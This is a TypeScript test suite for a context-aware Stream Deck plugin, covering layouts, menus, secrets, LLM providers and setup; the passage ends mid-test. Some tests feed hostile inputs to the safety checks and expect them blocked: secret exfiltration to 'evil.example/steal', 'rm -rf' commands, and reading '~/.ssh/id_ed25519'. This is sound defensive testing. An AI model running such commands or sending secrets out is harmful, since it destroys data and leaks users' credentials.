import assert from "node:assert/strict";
import { mkdtempSync, readdirSync, writeFileSync as wf, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { deleteLayout, installDefaults, layoutFile, loadConfig, stripJsonComments, validate, writeLayout } from "../src/config";
import { Engine, type DialSurface, type KeySurface } from "../src/engine";
import { colorFor, evaluate, extract, format, unsafeReason } from "../src/info";
import { askLLM, configuredProviders, parseChoices, resolveProvider } from "../src/llm";
import { chordToAppleScript, parseAppName, prettyBundle } from "../src/platform/mac";
import { axToChord, menuClickScript, parseAcceleratorDump, parseMenuDump, usefulEntries } from "../src/menus";
import { loadIcons, renderDial, renderKey } from "../src/render";
import { htmlToText, rankHits, type Digest } from "../src/research";
import { composeSmart, glob, inTime, levelOf, resolve, template, zonesFor, DEFAULT_ZONES, PLUS } from "../src/resolve";
import { deviceOf } from "../src/hosts/elgato/actions";
import { memoryStore, MissingSecretError, withSecrets } from "../src/secrets";
import { buildPrompt, chordKey, planToLayout, targetForApp, targetForSite } from "../src/setup";
import type { Action, Config, Context, LayoutDef } from "../src/types";
import { setPlatform } from "../src/platform";
import { parseChord } from "../src/platform/chords";
import { chordToVk } from "../src/platform/win";
import { chordToXdo, parseXprop, prettyName } from "../src/platform/linux";
import { macPlatform } from "../src/platform/mac";

// The fixtures are macOS bundle ids; adapter-specific tests set their own platform.
setPlatform(macPlatform);

const DEFAULTS = "com.var.contextdeck.sdPlugin/defaults";
const icons = loadIcons("com.var.contextdeck.sdPlugin/icons.json");
const loaded = loadConfig(`${DEFAULTS}/config.json`, `${DEFAULTS}/layouts`);
const cfg = loaded.config as Config;

const ctx = (p: Partial<Context> = {}): Context => ({ bundleId: "com.apple.Notes", app: "Notes", url: "", title: "", sub: "", flags: {}, now: new Date(2026, 9, 23, 14, 0), ...p });
const at = (h: number, m = 0) => new Date(2026, 9, 23, h, m);
const labels = (r: { keys: ({ label?: string } | null)[] }) => r.keys.map((k) => k?.label ?? null);
const dialLabels = (r: { dials: ({ label?: string } | null)[] }) => r.dials.map((d) => d?.label ?? null);

// ---------------- defaults & schema ----------------

test("defaults load from the folder tree and validate", () => {
	assert.deepEqual(loaded.errors, []);
	const ids = cfg.layouts.map((l) => l.id).sort();
	assert.ok(ids.includes("system") && ids.includes("app.browsers") && ids.includes("site.youtube.com") && ids.includes("takeover.recording"));
	for (const id of ids) assert.match(id, /^(system|app\.[\w.-]+|site\.[\w.-]+|sub\.[\w.-]+|takeover\.[\w.-]+)$/, `naming convention: ${id}`);
	assert.ok(loaded.sources["site.youtube.com"].endsWith("layouts/sites/site.youtube.com.json"));
});

function* everything(c: Config) {
	for (const l of c.layouts) {
		const groups = [l, ...Object.values(l.modes ?? {}), ...(l.pages ?? [])];
		for (const g of groups) {
			for (const k of g.keys ?? []) if (k) { yield { icon: k.icon, actions: [k.action, k.release, k.hold] }; if (k.action?.type === "overlay") for (const ok of k.action.overlay.keys ?? []) if (ok) yield { icon: ok.icon, actions: [ok.action] }; }
			for (const d of g.dials ?? []) if (d) yield { icon: d.icon, actions: [d.press, d.touch, "cw" in d ? d.cw : undefined, "ccw" in d ? d.ccw : undefined] };
		}
	}
}
const flatten = (a: Action | undefined): Action[] => (!a ? [] : a.type === "sequence" ? a.steps.flatMap(flatten) : [a]);

test("every icon exists and every chord compiles", () => {
	const missing = [...everything(cfg)].map((x) => x.icon).filter((i): i is string => !!i && !icons[i]);
	assert.deepEqual([...new Set(missing)], []);
	const compilers = { mac: (c: string) => chordToAppleScript(c), win: (c: string) => chordToVk(parseChord(c)), linux: (c: string) => chordToXdo(parseChord(c)) };
	let variants = 0;
	for (const x of everything(cfg)) for (const base of x.actions.flatMap(flatten)) {
		for (const os of ["mac", "win", "linux"] as const) {
			const a = flatten(base.on?.[os] ?? base).at(-1)!;
			if (base.on?.[os]) variants++;
			if (a.type === "keys") for (const c of a.keys.split(/\s+/)) assert.doesNotThrow(() => compilers[os](c), `${os}: ${c}`);
		}
	}
	assert.ok(variants > 30, "defaults carry Windows/Linux variants");
});

test("glob, time and template helpers", () => {
	assert.ok(glob("*studio.youtube.com*", "https://studio.youtube.com/video/abc/edit"));
	assert.ok(glob("/^https:\\/\\/github\\.com/", "https://github.com/x"));
	assert.ok(inTime(["21:30", "02:00"], at(23, 50)) && inTime(["21:30", "02:00"], at(1, 10)) && !inTime(["21:30", "02:00"], at(14)));
	assert.equal(template("{{state.agent.status}} / {{ctx.app}} / {{secret.X}}", { state: { "agent.status": "running" }, ctx: { app: "Code" } }), "running / Code / {{secret.X}}");
	assert.deepEqual(JSON.parse(stripJsonComments('{ "a": "x // y", /* c */ "b": [1,], }')), { a: "x // y", b: [1] });
	assert.ok(validate({ layouts: [{ id: "a" }, { id: "a" }] }).some((e) => e.includes("duplicate")));
	assert.ok(validate({ layouts: [{ id: "a", keys: [{ action: { type: "nope" } }] }] }).some((e) => e.includes("unknown action")));
});

// ---------------- three levels ----------------

test("levels are inferred from ids and matches", () => {
	assert.equal(levelOf({ id: "system" }), "system");
	assert.equal(levelOf({ id: "site.x.com" }), "sub");
	assert.equal(levelOf({ id: "legacy", match: { url: "*x*" } }), "sub");
	assert.equal(levelOf({ id: "legacy2", match: { bundleId: "com.x" } }), "app");
	assert.equal(levelOf({ id: "legacy3", match: { flags: "recording" } }), "takeover");
	assert.equal(levelOf({ id: "auto.com.x", match: { bundleId: "com.x" } }), "app", "0.2 auto.* layouts are app level");
});

test("resolution picks one layout per level", () => {
	const lv = (p: Partial<Context>) => Object.fromEntries(Object.entries(resolve(cfg, ctx(p)).levels).map(([k, v]) => [k, v?.id]));
	assert.deepEqual(lv({}), { system: "system", app: "app.default", sub: undefined });
	assert.deepEqual(lv({ bundleId: "com.apple.finder", now: at(8) }), { system: "system", app: "app.desktop.morning", sub: undefined });
	assert.deepEqual(lv({ bundleId: "com.google.Chrome", url: "https://www.youtube.com/watch?v=abc" }), { system: "system", app: "app.browsers", sub: "site.youtube.com" });
	assert.deepEqual(lv({ bundleId: "com.brave.Browser", url: "https://studio.youtube.com/channel/x" }), { system: "system", app: "app.browsers", sub: "site.studio.youtube.com" });
	assert.deepEqual(lv({ bundleId: "com.blackmagic-design.DaVinciResolve" }), { system: "system", app: "app.davinci-resolve", sub: undefined });
	assert.deepEqual(lv({ bundleId: "com.blackmagic-design.DaVinciResolve", flags: { recording: true } }), { system: "system", takeover: "takeover.recording" });
});

test("smart page: sub on top, app below, system in the corner; empty zones are handed over", () => {
	const yt = resolve(cfg, ctx({ bundleId: "com.google.Chrome", url: "https://www.youtube.com/watch?v=abc" }));
	assert.deepEqual(labels(yt), ["Play/Pause", "Back 10s", "Fwd 10s", "Fullscreen", "New Tab", "Close Tab", "Duplicate", "{{llm}}"]);
	assert.deepEqual(dialLabels(yt), ["Seek", "Speed", "Tabs", "Volume"]);
	assert.deepEqual(yt.keyOwners.map((o) => o?.id), ["site.youtube.com", "site.youtube.com", "site.youtube.com", "site.youtube.com", "app.browsers", "app.browsers", "app.browsers", "system"]);

	const gh = resolve(cfg, ctx({ bundleId: "com.google.Chrome", url: "https://github.com/x" }));
	assert.deepEqual(labels(gh), ["New Tab", "Close Tab", "Duplicate", "Reopen", "Back", "Copy URL", "Summarize", "{{llm}}"], "no site layout: browser fills the sub zone");
	assert.deepEqual(dialLabels(gh), ["Tabs", "Scroll", "Zoom", "Volume"]);

	const studio = resolve(cfg, ctx({ bundleId: "com.google.Chrome", url: "https://studio.youtube.com/x" }));
	assert.deepEqual(dialLabels(studio), ["Tabs", "Scroll", "Zoom", "Volume"], "site without dials: browser dials fill in");
});

test("composeSmart overflow: a short sub layout lends its spare slots back", () => {
	const sub: LayoutDef = { id: "site.a", keys: [{ label: "S1" }] };
	const app: LayoutDef = { id: "app.b", keys: ["A1", "A2", "A3", "A4", "A5"].map((label) => ({ label })) };
	const sys: LayoutDef = { id: "system", keys: [{ label: "AI" }] };
	const r = composeSmart(8, "keys", { sub, app, system: sys }, { sub: sub.keys, app: app.keys, system: sys.keys }, DEFAULT_ZONES);
	assert.deepEqual(r.items.map((k) => k?.label ?? null), ["S1", "A4", "A5", null, "A1", "A2", "A3", "AI"]);
});

test("pages: smart, each level in full, extra pages, system; duplicates dropped", () => {
	const yt = resolve(cfg, ctx({ bundleId: "com.google.Chrome", url: "https://www.youtube.com/watch?v=abc" }));
	assert.deepEqual(yt.pages.map((p) => p.id), ["smart", "sub", "site.youtube.com:Video", "app", "app.browsers:Tabs", "system"]);
	const subPage = resolve(cfg, ctx({ bundleId: "com.google.Chrome", url: "https://www.youtube.com/watch?v=abc" }), { page: "sub" });
	assert.deepEqual(labels(subPage), ["Play/Pause", "Back 10s", "Fwd 10s", "Fullscreen", "Captions", "Theater", "Next", "{{llm}}"], "full page keeps the AI key");
	const sys = resolve(cfg, ctx({}), { page: "system" });
	assert.equal(labels(sys)[6], "Battery");
	const notes = resolve(cfg, ctx({}));
	assert.deepEqual(notes.pages.map((p) => p.id), ["smart", "system"], "app page identical to smart is dropped");
});

test("legacy pinned block becomes the system layout", () => {
	const legacy: Config = { pinned: { keys: { "7": { label: "Claude" } }, dials: { "3": { kind: "volume", label: "Vol" } } }, layouts: [{ id: "default", keys: [{ label: "A" }] }] };
	const r = resolve(legacy, ctx());
	assert.equal(r.levels.system?.id, "system");
	assert.equal(labels(r)[7], "Claude");
	assert.equal(dialLabels(r)[3], "Vol");
});

// ---------------- menus ----------------

test("AX shortcuts become chords; menu dumps parse; click script", () => {
	assert.equal(axToChord("N", "1", ""), "shift+cmd+n");
	assert.equal(axToChord("+", "0", ""), "shift+cmd+=");
	assert.equal(axToChord("", "8", "122"), "f1");
	assert.equal(axToChord("B", "8", ""), undefined);
	const e = parseMenuDump(["File\tNew Frame\tN\t0\t\ttrue", "View\u001eTheme\tDark\t\t\t\ttrue", "Edit\tCopy\tC\t0\t\ttrue"].join("\n"));
	assert.deepEqual(usefulEntries(e, "Figma").map((x) => x.path.join(">")), ["File>New Frame", "View>Theme>Dark"]);
	assert.match(menuClickScript("com.figma.Desktop", ["View", "Theme", "Dark"]), /click menu item "Dark" of menu 1 of menu item "Theme"/);
	assert.equal(parseAppName('"Claude" ASN:0x0-0x1d01d:\n'), "Claude");
	assert.equal(prettyBundle("com.github.githubapp"), "Githubapp");
});

// ---------------- secrets ----------------

test("secrets: substituted only for declared hosts; URL secrets; missing", async () => {
	const store = memoryStore({ GITHUB_TOKEN: "ghp_x", HOME_ASSISTANT_URL: "http://192.168.1.5:8123", HOME_ASSISTANT_TOKEN: "ha" });
	const decls = { GITHUB_TOKEN: { hosts: ["api.github.com"] }, HOME_ASSISTANT_URL: { hosts: [] }, HOME_ASSISTANT_TOKEN: { hosts: ["secret:HOME_ASSISTANT_URL"] }, NEW_KEY: { hosts: ["x.com"] } };
	const ok = await withSecrets({ url: "https://api.github.com/n", headers: { Authorization: "Bearer {{secret.GITHUB_TOKEN}}" } }, "https://api.github.com/n", decls, store);
	assert.equal(ok.headers.Authorization, "Bearer ghp_x");
	await assert.rejects(withSecrets({ h: "{{secret.GITHUB_TOKEN}}" }, "https://evil.example/steal", decls, store), /may not be sent to evil\.example/);
	await assert.rejects(withSecrets({ h: "{{secret.UNDECLARED}}" }, "https://api.github.com", decls, store), /isn't declared/);
	await assert.rejects(withSecrets({ h: "{{secret.NEW_KEY}}" }, "https://x.com", decls, store), (e) => e instanceof MissingSecretError && e.secret === "NEW_KEY");
	const ha = await withSecrets({ url: "{{secret.HOME_ASSISTANT_URL}}/api/states", h: "Bearer {{secret.HOME_ASSISTANT_TOKEN}}" }, "{{secret.HOME_ASSISTANT_URL}}/api/states", decls, store);
	assert.deepEqual(ha, { url: "http://192.168.1.5:8123/api/states", h: "Bearer ha" });
});

// ---------------- info ----------------

test("info: extract, format filters, thresholds, safety", async () => {
	assert.equal(extract({ a: { b: [{ c: 5 }] } }, "a.b[0].c"), 5);
	assert.equal(extract([1, 2, 3], "length"), 3);
	assert.equal(extract("Now drawing from 'AC Power'\n -InternalBattery-0 87%; charging", "/(\\d+)%/"), "87");
	assert.equal(format("{{value|pct}}", 0.72), "72%");
	assert.equal(format("{{value|k}} subs", "15320"), "15.3k subs");
	assert.equal(format("resets {{raw.reset|until}}", 1, { reset: "2026-10-23T17:00:00Z" }, Date.parse("2026-10-23T14:30:00Z")), "resets 2h 30m");
	assert.equal(colorFor(15, [{ below: 20, color: "red" }]), "red");
	assert.equal(unsafeReason({ type: "applescript", script: 'tell application "Mail" to get unread count of inbox' }), undefined);
	assert.ok(unsafeReason({ type: "applescript", script: 'do shell script "rm -rf ~"' }));
	assert.ok(unsafeReason({ type: "command", cmd: ["/bin/rm", "-rf", "/"] }));
	assert.equal(unsafeReason({ type: "command", cmd: ["/usr/bin/pmset", "-g", "batt"] }), undefined);
	assert.ok(unsafeReason({ type: "file", path: "~/.ssh/id_ed25519" }));
	assert.ok(unsafeReason({ type: "http", url: "https://x.com", method: "POST" as "GET" }));
	const fetchImpl = (async () => new Response(JSON.stringify({ items: [{ statistics: { subscriberCount: "15320" } }] }))) as unknown as typeof fetch;
	const r = await evaluate({ source: { type: "http", url: "https://www.googleapis.com/youtube/v3/channels?key={{secret.YOUTUBE_API_KEY}}" }, extract: "items[0].statistics.subscriberCount", format: "{{value|k}}" },
		{ state: {}, secrets: memoryStore({ YOUTUBE_API_KEY: "k" }), decls: { YOUTUBE_API_KEY: { hosts: ["www.googleapis.com"] } }, fetchImpl });
	assert.equal(r.text, "15.3k");
	const p = await evaluate({ source: { type: "state", key: "render.progress" }, format: "{{value}}%", progress: { max: 100 } }, { state: { "render.progress": 40 }, secrets: memoryStore(), decls: {} });
	assert.equal(p.progress, 0.4);
});

// ---------------- research ----------------

test("research helpers: html to text keeps shortcut tables; official docs rank first", () => {
	const t = htmlToText("<html><nav>menu</nav><table><tr><td>New frame</td><td><kbd>⌘</kbd><kbd>N</kbd></td></tr></table><script>x()</script></html>");
	assert.ok(t.includes("New frame | [⌘][N]") && !t.includes("x()") && !t.includes("menu"));
	const hits = rankHits([
		{ title: "Top 10 tricks", url: "https://www.youtube.com/watch?v=1", snippet: "" },
		{ title: "Keyboard shortcuts", url: "https://help.figma.com/hc/en-us/articles/shortcuts", snippet: "" },
	], "Figma");
	assert.equal(hits[0].url, "https://help.figma.com/hc/en-us/articles/shortcuts");
	assert.equal(chordKey("shift+cmd+N"), chordKey("cmd+shift+n"));
});

// ---------------- setup plan ----------------

test("plan → layout: confidence tags, API actions with secrets, info keys, More page, unsafe dropped", () => {
	const entries = parseMenuDump(["File\tNew Frame\tN\t0\t\ttrue", "View\tZoom In\t+\t0\t\ttrue", "View\tZoom Out\t-\t0\t\ttrue"].join("\n"));
	const digest: Digest = { app: "Figma", shortcuts: [{ action: "Frame tool", keys: "f", source: "https://help.figma.com/x" }], info: [], apis: [], sources: [] };
	const t = targetForApp("com.figma.Desktop", "Figma");
	const { prompt } = buildPrompt({ target: t, entries, slots: { keys: 7, dials: 3 }, iconHints: ["play"], digest, platform: { os: "macOS 26.1", arch: "arm64", keyboard: "U.S.", locale: "en-IN", appVersion: "125.1" } });
	assert.ok(prompt.includes("macOS 26.1") && prompt.includes("app version 125.1") && prompt.includes("Frame tool"));
	const plan = {
		name: "Figma", color: "#A259FF",
		keys: [
			{ label: "New Frame", icon: "frame", do: { menu: "File > New Frame" } },
			{ label: "Frame", icon: "frame", do: { keys: "F" }, source: "https://help.figma.com/x" },
			{ label: "Guess", do: { keys: "cmd+shift+9" } },
			{ label: "Comment", icon: "message-square", do: { http: { url: "https://api.figma.com/v1/files/x/comments", method: "POST", headers: { "X-Figma-Token": "{{secret.FIGMA_TOKEN}}" }, body: { message: "hi" } } } },
			{ label: "Leak", do: { http: { url: "https://evil.example", headers: { a: "{{secret.OTHER}}" } } } },
			{ label: "Files", icon: "folder-open", info: { source: { type: "http", url: "https://api.figma.com/v1/me", headers: { "X-Figma-Token": "{{secret.FIGMA_TOKEN}}" } }, extract: "email" } },
			{ label: "Danger", info: { source: { type: "applescript", script: 'do shell script "curl x"' } } },
			...["K1", "K2", "K3", "K4"].map((label) => ({ label, do: { keys: "cmd+1" } })),
		],
		dials: [{ label: "Zoom", icon: "zoom-in", cw: { menu: "View > Zoom In" }, ccw: { menu: "View > Zoom Out" } }],
		secrets: { FIGMA_TOKEN: { description: "Figma personal access token", url: "https://www.figma.com/developers/api#access-tokens", hosts: ["api.figma.com"] }, lowercase: { hosts: ["x"] } },
	};
	const { layout, dropped } = planToLayout(t, plan as never, entries, icons, { keySlots: 7, dialSlots: 3, model: "m", digest, allowKnowledge: true });
	assert.equal(layout.id, "app.com.figma.Desktop");
	assert.equal(layout.level, "app");
	const k = layout.keys!;
	assert.deepEqual(k.map((x) => x?.label), ["New Frame", "Frame", "Guess", "Comment", "Files", "K1", "K2"]);
	assert.equal(k[0]?.meta?.confidence, "verified");
	assert.deepEqual(k[1]?.meta, { confidence: "documented", source: "https://help.figma.com/x" });
	assert.equal(k[2]?.meta?.confidence, "knowledge");
	assert.deepEqual(k[3]?.requires, ["FIGMA_TOKEN"]);
	assert.equal(k[3]?.action?.type, "http");
	assert.ok(k[4]?.info && k[4]?.requires?.includes("FIGMA_TOKEN"));
	assert.deepEqual(layout.pages?.[0].keys?.map((x) => x?.label), ["K3", "K4"]);
	assert.deepEqual(Object.keys(layout.secrets ?? {}), ["FIGMA_TOKEN"]);
	assert.ok(dropped.some((d) => d.includes("undeclared secret OTHER")) && dropped.some((d) => d.includes("Danger")) && dropped.some((d) => d.includes("lowercase")));
	assert.deepEqual(validate({ layouts: [layout] }), []);

	const strict = planToLayout(t, plan as never, entries, icons, { keySlots: 7, dialSlots: 3, model: "m", digest, allowKnowledge: false });
	assert.ok(!strict.layout.keys!.some((x) => x?.label === "Guess"), "knowledge-only shortcuts dropped when research is required");
	assert.equal(targetForSite("com.google.Chrome", "https://www.notion.so/p")?.id, "site.notion.so");
});

// ---------------- files ----------------

test("first-run install, canonical folders, rename moves files, delete", () => {
	const home = mkdtempSync(join(tmpdir(), "cd-"));
	installDefaults(DEFAULTS, home);
	assert.ok(existsSync(join(home, "config.json")));
	assert.ok(readdirSync(join(home, "layouts", "sites")).includes("site.youtube.com.json"));
	const all = loadConfig(join(home, "config.json"), join(home, "layouts"));
	assert.equal(all.config!.layouts.length, cfg.layouts.length);
	const ldir = join(home, "layouts");
	wf(join(ldir, "auto.com.x.json"), JSON.stringify({ id: "app.com.x", match: { bundleId: "com.x" }, keys: [] }));
	const file = writeLayout({ id: "app.com.x", level: "app", match: { bundleId: "com.x" }, keys: [{ label: "X", action: { type: "keys", keys: "cmd+x" } }] }, ldir, join(home, "config.json"));
	assert.equal(file, layoutFile("app.com.x", ldir, { id: "app.com.x", level: "app" }));
	assert.ok(file.endsWith("layouts/apps/app.com.x.json"));
	assert.ok(!existsSync(join(ldir, "auto.com.x.json")), "old copy of the same id removed");
	wf(join(ldir, "apps", "broken.json"), "{ nope");
	const again = loadConfig(join(home, "config.json"), ldir);
	assert.equal(again.errors.length, 1);
	assert.ok(deleteLayout("app.com.x", ldir, join(home, "config.json")));
});

// ---------------- LLM providers ----------------

type Call = { url: string; headers: Record<string, string>; body: Record<string, unknown> };
function fakeFetch(handler: (c: Call) => { status?: number; json: unknown }) {
	const calls: Call[] = [];
	const f = (async (url: string, init: RequestInit) => {
		const c = { url, headers: init.headers as Record<string, string>, body: JSON.parse(String(init.body)) };
		calls.push(c);
		const r = handler(c);
		return new Response(JSON.stringify(r.json), { status: r.status ?? 200 });
	}) as unknown as typeof fetch;
	return { f, calls };
}

test("providers: presets, OpenAI-compatible + Anthropic formats, JSON-mode retry, errors", async () => {
	const s = { providers: { openrouter: { model: "vendor/m" }, openai: { model: "m" }, home: { type: "openai" as const, baseUrl: "http://10.0.0.2:8000/v1", model: "qwen", noKey: true } } };
	assert.deepEqual(configuredProviders(s), ["anthropic", "openrouter", "openai", "home"]);
	assert.equal(resolveProvider(s, "openrouter")?.def.baseUrl, "https://openrouter.ai/api/v1");
	process.env.OPENROUTER_API_KEY = "or"; process.env.OPENAI_API_KEY = "sk"; process.env.ANTHROPIC_API_KEY = "ak";
	const or = fakeFetch(() => ({ json: { choices: [{ message: { content: "<think>x</think> Hi" } }] } }));
	assert.equal((await askLLM(s, { provider: "openrouter", prompt: "p" }, or.f)).text, "Hi");
	assert.equal(or.calls[0].headers.authorization, "Bearer or");
	let n = 0;
	const oa = fakeFetch(() => (n++ === 0 ? { status: 400, json: { error: { message: "no json mode" } } } : { json: { choices: [{ message: { content: "{}" } }] } }));
	await askLLM(s, { provider: "openai", prompt: "JSON", json: true }, oa.f);
	assert.deepEqual(oa.calls[0].body.response_format, { type: "json_object" });
	assert.equal(oa.calls[1].body.response_format, undefined);
	const bad = fakeFetch(() => ({ status: 401, json: { error: { message: "invalid x-api-key" } } }));
	await assert.rejects(askLLM({}, { prompt: "Hi" }, bad.f), /Claude 401: invalid x-api-key/);
	await assert.rejects(askLLM({}, { provider: "nope", prompt: "x" }, bad.f), /Unknown LLM provider/);
	assert.deepEqual(parseChoices("1. One\n- \"Two\""), ["One", "Two"]);
});

// ---------------- engine ----------------

function rig(config: Config = cfg) {
	const e = new Engine();
	const images = new Map<number, string>();
	const feedback = new Map<number, string>();
	const svg = (img: string) => Buffer.from(img.split(",")[1], "base64").toString();
	const written: LayoutDef[] = [];
	const store = memoryStore();
	e.deps = {
		...e.deps,
		scanMenus: async () => [],
		ask: async () => { throw new Error("no ask stub"); },
		writeLayout: (l) => { written.push(l); return `/tmp/${l.id}.json`; },
		removeLayout: () => undefined,
		saveSetupState: () => undefined, savePrefs: () => undefined,
		icons: () => icons,
		secrets: store,
		prompt: async () => undefined,
		platform: async () => ({ os: "macOS 26.1", arch: "arm64", keyboard: "U.S.", locale: "en-IN", appVersion: "2.0" }),
		appVersion: async () => "",
		search: async () => [],
		fetchPage: async () => "",
		loadResearch: () => undefined, saveResearch: () => undefined,
	};
	e.setConfig(config, []);
	for (let i = 0; i < 8; i++) e.addKey({ id: `k${i}`, setImage: async (img) => { images.set(i, svg(img!)); }, setTitle: async () => undefined, showAlert: async () => undefined, showOk: async () => undefined } as KeySurface, i);
	for (let i = 0; i < 4; i++) e.addDial({ id: `d${i}`, setFeedback: async (f) => { feedback.set(i, svg((f as { canvas: string }).canvas)); }, setTriggerDescription: async () => undefined, showAlert: async () => undefined } as DialSurface, i);
	return { e, images, feedback, written, store };
}

test("engine: levels on the deck, page navigation by touch strip, page memory per context", () => {
	const { e, images, feedback } = rig();
	e.updateContext({ bundleId: "com.google.Chrome", app: "Chrome", url: "https://www.youtube.com/watch?v=1" });
	assert.deepEqual(e.snapshot().levels, { system: "system", app: "app.browsers", sub: "site.youtube.com" });
	assert.deepEqual(e.snapshot().keys, ["Play/Pause", "Back 10s", "Fwd 10s", "Fullscreen", "New Tab", "Close Tab", "Duplicate", "Claude"]);
	assert.ok(images.get(0)!.includes("#FF0033") && images.get(4)!.includes("#14B8A6"), "stripe colour shows which level a key belongs to");
	assert.ok(feedback.get(3)!.includes("1/6"), "page indicator on the strip");
	e.dialTouch(3, false, 190);
	assert.equal(e.snapshot().page.id, "sub");
	e.dialTouch(0, false, 10);
	assert.equal(e.snapshot().page.id, "smart");
	e.goPage("app.browsers:Tabs");
	assert.equal(e.snapshot().keys[0], "Pin Tab");
	e.updateContext({ bundleId: "com.apple.Notes", app: "Notes", url: "" });
	assert.equal(e.snapshot().page.id, "smart");
	e.updateContext({ bundleId: "com.google.Chrome", app: "Chrome", url: "https://www.youtube.com/watch?v=2" });
	assert.equal(e.snapshot().page.id, "app.browsers:Tabs", "page remembered for this context");
});

test("engine: info keys poll and render; secrets gate keys; secretSet stores via prompt", async () => {
	const { e, images, store } = rig();
	e.goPage("system");
	e.deps.evaluateInfo = async () => ({ value: "87", text: "87%", progress: 0.87, at: Date.now() });
	await e.pollInfo();
	assert.ok(images.get(6)!.includes("87%"), "battery info key renders its value");

	e.goPage(0);
	e.updateContext({ bundleId: "com.google.Chrome", app: "Chrome", url: "https://studio.youtube.com/x" });
	e.goPage("sub");
	await e.refreshMissingSecrets();
	const subsIdx = e.snapshot().keys.indexOf("Subs");
	assert.ok(subsIdx >= 0);
	assert.ok(images.get(subsIdx)!.includes("needs YOUTUBE_API_KEY"));
	const asked: string[] = [];
	e.deps.prompt = async (_t, m) => { asked.push(m); return "AIza-test"; };
	e.keyDown(subsIdx); e.keyUp(subsIdx);
	await new Promise((r) => setTimeout(r, 20));
	assert.equal(await store.get("YOUTUBE_API_KEY"), "AIza-test");
	assert.ok(asked[0].includes("console.cloud.google.com"), "prompt shows where to get the key");
	assert.ok(images.get(subsIdx)!.includes("needs YOUTUBE_CHANNEL_ID"), "next missing secret");
});

test("engine: http action resolves secrets from the key's own layout", async () => {
	const layout: LayoutDef = { id: "app.com.x", match: { bundleId: "com.x" }, secrets: { X_TOKEN: { hosts: ["api.x.com"] } }, keys: [{ label: "Ping", requires: ["X_TOKEN"], action: { type: "http", url: "https://api.x.com/ping", method: "POST", headers: { Authorization: "Bearer {{secret.X_TOKEN}}" } } }] };
	const { e, store } = rig({ ...cfg, layouts: [...cfg.layouts, layout] });
	await store.set("X_TOKEN", "t0k");
	const seen: { url: string; auth: string }[] = [];
	e.deps.fetch = (async (url: string, init: RequestInit) => { seen.push({ url, auth: (init.headers as Record<string, string>).Authorization }); return new Response("{}"); }) as unknown as typeof fetch;
	e.updateContext({ bundleId: "com.x", app: "X" });
	await e.refreshMissingSecrets();
	e.keyDown(0); e.keyUp(0);
	await new Promise((r) => setTimeout(r, 20));
	assert.deepEqual(seen, [{ url: "https://api.x.com/ping", auth: "Bearer t0k" }]);
});

test("engine: ✨ Set up with research, info dry-run, versioned Update, legacy id cleanup", async () => {
	const { e, written } = rig();
	const searched: string[] = [];
	e.config = { ...e.config, settings: { ...e.config.settings, research: { provider: "brave" } } };
	e.deps.search = async (q) => { searched.push(q); return [{ title: "Pages shortcuts", url: "https://support.apple.com/pages-shortcuts", snippet: "" }]; };
	e.deps.fetchPage = async () => "Bold | [⌘][B]";
	e.deps.scanMenus = async () => parseMenuDump(["Format\tBold\tB\t0\t\ttrue", "File\tNew\tN\t0\t\ttrue"].join("\n"));
	const prompts: string[] = [];
	e.deps.ask = async (o) => {
		prompts.push(o.prompt);
		if (o.prompt.includes("From the documents below")) return JSON.stringify({ app: "Pages", shortcuts: [{ action: "Bold", keys: "cmd+b", source: "https://support.apple.com/pages-shortcuts" }], info: [], apis: [] });
		return JSON.stringify({ name: "Pages", color: "#FF9500", keys: [
			{ label: "New", icon: "plus", do: { menu: "File > New" } },
			{ label: "Bold", icon: "bold", do: { menu: "Format > Bold" } },
			{ label: "Words", icon: "type", info: { source: { type: "applescript", script: 'tell application "Pages" to get word count of front document' } } },
			{ label: "Broken", icon: "x", info: { source: { type: "file", path: "~/nope.json" } } },
		], dials: [{ label: "Zoom", cw: { builtin: "zoom" }, ccw: { builtin: "zoom" } }] });
	};
	e.deps.evaluateInfo = async (spec) => spec.source.type === "file" ? { value: undefined, text: "—", error: "ENOENT", at: 0 } : { value: 120, text: "120", at: 0 };
	e.updateContext({ bundleId: "com.apple.iWork.Pages", app: "Pages" });
	assert.equal(e.snapshot().keys[6], "Set up");
	const r = await e.runSetup({ index: 6 });
	assert.equal(r.ok, true, r.error);
	assert.ok(searched[0].includes("Pages 2.0 keyboard shortcuts mac"), "version-aware query");
	assert.ok(prompts[1].includes("macOS 26.1") && prompts[1].includes("support.apple.com"), "plan prompt gets platform + research");
	const l = written[0];
	assert.equal(l.id, "app.com.apple.iWork.Pages");
	assert.equal(l.generated?.source, "research");
	assert.equal(l.generated?.appVersion, "2.0");
	assert.deepEqual(l.keys?.map((k) => k?.label), ["New", "Bold", "Words"], "failing info source dropped by the dry-run");
	assert.ok(r.dropped?.some((d) => d.includes("Broken")));
	assert.deepEqual(e.snapshot().levels, { system: "system", app: "app.com.apple.iWork.Pages", sub: null });

	e.versions.set("com.apple.iWork.Pages", "3.0");
	e.recompute(true);
	assert.equal(e.snapshot().keys[6], "Update", "newer installed version offers an update");
});

test("engine: site setup under the generic browser layout; hand-written layouts are never rebuilt", async () => {
	const { e, written } = rig();
	e.deps.ask = async () => JSON.stringify({ name: "Linear", keys: [{ label: "New Issue", icon: "plus", do: { keys: "c" } }] });
	e.updateContext({ bundleId: "com.google.Chrome", app: "Chrome", url: "https://linear.app/team/issues" });
	assert.equal(e.snapshot().setup.target, "site.linear.app");
	const r = await e.runSetup({ index: 6 });
	assert.equal(r.ok, true, r.error);
	assert.equal(written[0].level, "sub");
	assert.deepEqual(e.snapshot().levels, { system: "system", app: "app.browsers", sub: "site.linear.app" });
	assert.deepEqual(e.snapshot().keys, ["New Issue", "Reopen", "Back", "Copy URL", "New Tab", "Close Tab", "Duplicate", "Claude"], "site key + browser tab ops; browser overflow fills spare slots");
	e.updateContext({ bundleId: "com.blackmagic-design.DaVinciResolve", app: "DaVinci Resolve", url: "" });
	const refused = await e.runSetup({ force: true });
	assert.match(refused.error!, /hand-written/);
});

test("renderers: info value + bar, page chevrons", () => {
	const k = renderKey({ label: "Battery", glyph: "87%", color: "#22C55E", bg: "#111", bar: 0.87 });
	assert.ok(k.includes("87%") && k.includes('y="134"'));
	const d = renderDial({ label: "Seek", color: "#F00", bg: "#111", prev: true, pageText: "Video" });
	assert.ok(d.includes("M7 42") && d.includes("Video"));
});

test("most specific URL wins; empty layout files are skipped", () => {
	const c: Config = { layouts: [
		{ id: "site.youtube.com", level: "sub", match: { url: ["*://youtube.com/*", "*://*.youtube.com/*"] }, keys: [{ label: "YT" }] },
